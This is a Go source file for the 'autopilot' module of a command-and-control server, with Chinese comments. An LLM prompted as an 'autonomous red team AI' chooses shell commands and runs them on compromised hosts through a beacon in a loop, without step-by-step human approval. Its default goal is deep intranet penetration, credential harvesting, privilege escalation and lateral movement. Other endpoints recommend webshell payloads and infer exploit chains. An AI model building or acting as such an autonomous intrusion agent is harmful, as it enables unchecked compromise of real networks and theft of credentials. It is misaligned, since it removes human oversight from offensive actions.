package server

// c2_autopilot.go — C2 AI 自动驾驶：持续分析→决策→执行循环。
//   POST /api/tools/c2/autopilot/start   启动（指定 beacon + 目标 + 边界）
//   POST /api/tools/c2/autopilot/stop    停止
//   GET  /api/tools/c2/autopilot/status  状态（当前轮次/已执行动作/图节点数）

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

// AutopilotState 自动驾驶全局状态。
type AutopilotState struct {
	mu sync.Mutex
	Running   bool   `json:"running"`
	SessionID string `json:"session_id"`
	Goal      string `json:"goal"`
	Round     int    `json:"round"`
	MaxRounds int    `json:"max_rounds"`
	CoolDown  int    `json:"cooldown_sec"`
	Actions   []AutopilotAction `json:"actions"`
	StartedAt string `json:"started_at"`
	cancel    context.CancelFunc
}

// AutopilotAction AI 自动驾驶执行的一步。
type AutopilotAction struct {
	Round  int    `json:"round"`
	Cmd    string `json:"cmd"`
	Label  string `json:"label"`
	Output string `json:"output"`
	OK     bool   `json:"ok"`
	Reason string `json:"reason"`
}

var autopilot = &AutopilotState{MaxRounds: 10, CoolDown: 5}

// autopilotPrompt AI 自动驾驶系统提示。
const autopilotPrompt = `你是自主红队 AI。当前攻击链路图如下：

%s

目标是：%s

已执行 %d 轮，剩余 %d 轮。

请决定下一步行动。输出严格 JSON：
[{"cmd":"要执行的命令","label":"简短标签","reason":"决策理由","type":"cmd|asset|cred|lateral|ai_insight"}]

规则：
1. 每轮最多 2 条命令
2. 如果图上已有"信息收集"类节点，不要重复执行 uname/id 等基础侦察
3. 优先尝试：提权检测 → 凭据搜集 → 内网探测 → 横向移动
4. 如果已获得 root 权限且有凭据，转向横向移动或数据搜集
5. 如果无法判断下一步有价值，输出 [] 并说明原因
6. 命令用英文，标签和理由用中文

只输出 JSON 数组，不要代码围栏。`

// POST /api/tools/c2/autopilot/start — 启动自动驾驶。
func (s *Server) autopilotStart(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
		Goal      string `json:"goal"`
		MaxRounds int    `json:"max_rounds"`
		CoolDown  int    `json:"cooldown_sec"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	if b.Goal == "" {
		b.Goal = "尽可能深入地渗透内网，收集凭据和敏感信息"
	}
	if b.MaxRounds <= 0 || b.MaxRounds > 50 {
		b.MaxRounds = 10
	}
	if b.CoolDown < 3 {
		b.CoolDown = 5
	}

	autopilot.mu.Lock()
	if autopilot.Running {
		autopilot.mu.Unlock()
		writeErr(w, 409, "自动驾驶已在运行（session_id="+autopilot.SessionID+"）——先停止再启动")
		return
	}
	autopilot.Running = true
	autopilot.SessionID = b.SessionID
	autopilot.Goal = b.Goal
	autopilot.Round = 0
	autopilot.MaxRounds = b.MaxRounds
	autopilot.CoolDown = b.CoolDown
	autopilot.Actions = nil
	autopilot.StartedAt = time.Now().Format("15:04:05")
	ctx, cancel := context.WithCancel(context.Background())
	autopilot.cancel = cancel
	autopilot.mu.Unlock()

	// 启动循环
	go s.autopilotLoop(ctx, b.SessionID, b.Goal)

	writeJSON(w, 200, map[string]any{"data": map[string]any{
		"running": true, "session_id": b.SessionID, "goal": b.Goal,
		"max_rounds": b.MaxRounds, "cooldown_sec": b.CoolDown,
	}})
}

// POST /api/tools/c2/autopilot/stop — 停止。
func (s *Server) autopilotStop(w http.ResponseWriter, r *http.Request) {
	autopilot.mu.Lock()
	defer autopilot.mu.Unlock()
	if autopilot.cancel != nil {
		autopilot.cancel()
	}
	autopilot.Running = false
	total := len(autopilot.Actions)
	okCount := 0
	for _, a := range autopilot.Actions {
		if a.OK {
			okCount++
		}
	}
	writeJSON(w, 200, map[string]any{"data": map[string]any{
		"running": false, "total_actions": total, "ok_actions": okCount,
		"rounds_completed": autopilot.Round,
	}})
}

// GET /api/tools/c2/autopilot/status — 状态。
func (s *Server) autopilotStatus(w http.ResponseWriter, r *http.Request) {
	autopilot.mu.Lock()
	defer autopilot.mu.Unlock()
	writeJSON(w, 200, map[string]any{"data": autopilot})
}

// autopilotLoop 自动驾驶主循环。
func (s *Server) autopilotLoop(ctx context.Context, sessionID, goal string) {
	defer func() {
		autopilot.mu.Lock()
		autopilot.Running = false
		autopilot.mu.Unlock()
		s.c2NotifyGraph(sessionID) // 通知前端图更新
	}()

	for round := 1; round <= autopilot.MaxRounds; round++ {
		select {
		case <-ctx.Done():
			return
		default:
		}

		autopilot.mu.Lock()
		autopilot.Round = round
		autopilot.mu.Unlock()

		// 1) 获取图上下文
		graphCtx := s.c2GraphContext(sessionID)

		// 2) AI 决策
		remaining := autopilot.MaxRounds - round
		prompt := fmt.Sprintf(autopilotPrompt, graphCtx, goal, round-1, remaining)

		plan, err := s.autopilotPlan(ctx, prompt)
		if err != nil {
			time.Sleep(time.Duration(autopilot.CoolDown) * time.Second)
			continue
		}

		// 解析计划
		type planItem struct {
			Cmd    string `json:"cmd"`
			Label  string `json:"label"`
			Reason string `json:"reason"`
			Type   string `json:"type"`
		}
		var items []planItem
		if err := json.Unmarshal([]byte(plan), &items); err != nil || len(items) == 0 {
			// AI 无建议——冷却后继续
			time.Sleep(time.Duration(autopilot.CoolDown) * time.Second)
			continue
		}

		// 3) 执行
		rootID := s.c2GetOrCreateRoot(sessionID)
		for _, item := range items {
			select {
			case <-ctx.Done():
				return
			default:
			}
			if item.Cmd == "" {
				continue
			}

			// 建图节点
			var nodeID int64
			s.m.PG().QueryRow(`INSERT INTO c2_graph_nodes (session_id, parent_id, node_type, label, detail, status)
				VALUES ($1,$2,$3,$4,'','running') RETURNING id`,
				sessionID, &rootID, item.Type, item.Label).Scan(&nodeID)

			// 执行
			output, err := s.c2ExecAndWaitCtx(ctx, sessionID, item.Cmd)

			status := "done"
			out := truncateStr(output, 4000)
			if err != nil {
				status = "failed"
				out = err.Error()
			}
			_, _ = s.m.PG().Exec("UPDATE c2_graph_nodes SET detail=$1, status=$2 WHERE id=$3", out, status, nodeID)

			action := AutopilotAction{
				Round: round, Cmd: item.Cmd, Label: item.Label,
				Output: truncateStr(out, 200), OK: err == nil, Reason: item.Reason,
			}
			autopilot.mu.Lock()
			autopilot.Actions = append(autopilot.Actions, action)
			autopilot.mu.Unlock()

			// 自动发现分析
			if err == nil && c2ShouldAnalyze(output) {
				go s.c2AnalyzeAndReport(context.Background(), sessionID, "", item.Cmd, output)
			}

			// SSE 通知
			s.c2NotifyTaskResult(sessionID, fmt.Sprintf("%d", nodeID), out)
		}

		// 通知图更新
		s.c2NotifyGraph(sessionID)

		// 冷却
		select {
		case <-ctx.Done():
			return
		case <-time.After(time.Duration(autopilot.CoolDown) * time.Second):
		}
	}
}

// autopilotPlan AI 规划（复用 LLM 基建）。
func (s *Server) autopilotPlan(ctx context.Context, prompt string) (string, error) {
	profileID := s.reviewerProfileID()
	if profileID == 0 {
		if p, err := s.m.pg.ActiveProfile(); err == nil && p != nil {
			profileID = p.ID
		}
	}
	prov, _, ok := s.providerForProfile(profileID)
	if !ok {
		return "", fmt.Errorf("LLM 不可用")
	}
	ctx2, cancel := context.WithTimeout(ctx, 60*time.Second)
	defer cancel()
	return streamCollectText(ctx2, prov, "你是自主红队 AI 指挥官。", prompt)
}

// ---- AI 漏洞链推断 ----

// POST /api/tools/c2/autopilot/chain — AI 分析多个 finding 的组合攻击路径。
func (s *Server) autopilotChain(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}

	// 获取该会话的图上下文
	graphCtx := s.c2GraphContext(b.SessionID)

	chainPrompt := `分析以下攻击链路图，识别可组合的攻击路径：

` + graphCtx + `

请输出 JSON：
{
  "chains": [
    {
      "name": "攻击链名称",
      "steps": ["步骤1", "步骤2", "步骤3"],
      "impact": "影响描述",
      "severity": "critical|high|medium"
    }
  ],
  "next_move": "建议的下一步最优行动"
}

规则：
1. 识别可以组合的漏洞（如：SQL注入读文件 + 文件写入 = RCE）
2. 识别横向移动机会（凭据 + 内网可达 = 横向）
3. 每条链包含明确的步骤序列
4. 最多 3 条链

只输出 JSON。`

	profileID := s.reviewerProfileID()
	if profileID == 0 {
		if p, err := s.m.pg.ActiveProfile(); err == nil && p != nil {
			profileID = p.ID
		}
	}
	prov, _, ok := s.providerForProfile(profileID)
	if !ok {
		writeErr(w, 502, "LLM 不可用")
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	result, err := streamCollectText(ctx, prov, chainPrompt, "请分析攻击链路：")
	if err != nil {
		writeErr(w, 502, "AI 失败: "+err.Error())
		return
	}

	// 剥围栏
	result = strings.TrimSpace(result)
	if i := strings.Index(result, "{"); i >= 0 {
		if j := strings.LastIndex(result, "}"); j > i {
			result = result[i : j+1]
		}
	}

	var chainResult map[string]any
	if err := json.Unmarshal([]byte(result), &chainResult); err != nil {
		writeJSON(w, 200, map[string]any{"data": map[string]any{"raw": result}})
		return
	}
	writeJSON(w, 200, map[string]any{"data": chainResult})
}

// ---- 指纹→载荷自动匹配 ----

// POST /api/tools/c2/autopilot/match — 检测目标环境并推荐最优载荷。
func (s *Server) autopilotMatch(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}

	// 通过 beacon 检测目标环境
	envCheck, err := s.c2ExecAndWaitCtx(r.Context(), b.SessionID,
		"which php java python3 node aspnet 2>/dev/null; php -v 2>/dev/null | head -1; java -version 2>&1 | head -1; uname -m")
	if err != nil {
		writeErr(w, 502, "环境检测失败: "+err.Error())
		return
	}

	// 分析环境并推荐
	type recommendation struct {
		ScriptType string `json:"script_type"`
		Encoder    string `json:"encoder"`
		Reason     string `json:"reason"`
	}
	var recs []recommendation
	lower := strings.ToLower(envCheck)

	if strings.Contains(lower, "php") {
		if strings.Contains(lower, "openssl") {
			recs = append(recs, recommendation{ScriptType: "php", Encoder: "aes", Reason: "检测到 PHP + OpenSSL，推荐冰蝎 AES 协议（加密流量）"})
		}
		recs = append(recs, recommendation{ScriptType: "php", Encoder: "raw", Reason: "PHP 环境可用蚁剑 raw 协议（兼容性最好）"})
	}
	if strings.Contains(lower, "java") || strings.Contains(lower, "openjdk") {
		recs = append(recs, recommendation{ScriptType: "jsp", Encoder: "aes", Reason: "检测到 Java，推荐 JSP + AES"})
	}
	if strings.Contains(lower, "python3") {
		recs = append(recs, recommendation{ScriptType: "py", Encoder: "raw", Reason: "检测到 Python3"})
	}
	if strings.Contains(lower, "node") {
		recs = append(recs, recommendation{ScriptType: "node", Encoder: "aes", Reason: "检测到 Node.js"})
	}
	if len(recs) == 0 {
		recs = append(recs, recommendation{ScriptType: "php", Encoder: "raw", Reason: "未检测到特定环境，默认 PHP + raw"})
	}

	writeJSON(w, 200, map[string]any{"data": map[string]any{
		"env": truncateStr(envCheck, 300),
		"recommendations": recs,
	}})
}

// ---- AI 报告增强 ----

// POST /api/tools/c2/autopilot/report — AI 分析全部 findings 生成执行摘要。
func (s *Server) autopilotReport(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}

	// 获取图节点（包含全部发现）
	graphCtx := s.c2GraphContext(b.SessionID)

	reportPrompt := `基于以下攻击链路图，生成专业的渗透测试报告摘要。

` + graphCtx + `

请生成 Markdown 格式报告，包含：

## 执行摘要
（2-3 句总结攻击成果和风险等级）

## 攻击路径
（按时间线描述攻击者如何从初始访问到最终目标）

## 发现列表
| 严重度 | 发现 | 影响 | 建议 |
|--------|------|------|------|
（列出所有发现，按严重度排序）

## 修复优先级
1. [P0] 最紧急...
2. [P1] ...
3. [P2] ...
`

	profileID := s.reviewerProfileID()
	if profileID == 0 {
		if p, err := s.m.pg.ActiveProfile(); err == nil && p != nil {
			profileID = p.ID
		}
	}
	prov, _, ok := s.providerForProfile(profileID)
	if !ok {
		writeErr(w, 502, "LLM 不可用")
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()
	report, err := streamCollectText(ctx, prov, reportPrompt, "请生成报告：")
	if err != nil {
		writeErr(w, 502, "AI 报告生成失败: "+err.Error())
		return
	}
	writeJSON(w, 200, map[string]any{"data": map[string]any{"report": report}})
}

// c2ExecAndWaitCtx context 版本的执行等待（goroutine 内使用）。
func (s *Server) c2ExecAndWaitCtx(ctx context.Context, sessionID, cmd string) (string, error) {
	tid, err := c2Client().EnqueueTask(ctx, sessionID, "exec", map[string]any{"cmd": cmd})
	if err != nil {
		return "", err
	}
	if tid == "" {
		return "", fmt.Errorf("无 taskId")
	}
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		case <-time.After(600 * time.Millisecond):
		}
		tasks, err := c2Client().ListTasks(ctx, sessionID, nil)
		if err != nil {
			continue
		}
		for _, t := range tasks {
			m, ok := t.(map[string]any)
			if !ok {
				continue
			}
			id, _ := m["id"].(string)
			if id != tid {
				continue
			}
			if out, _ := m["output"].(string); out != "" {
				return out, nil
			}
			if st, _ := m["status"].(string); st == "done" || st == "completed" {
				return "", nil
			}
		}
	}
	return "", fmt.Errorf("30s 超时")
}
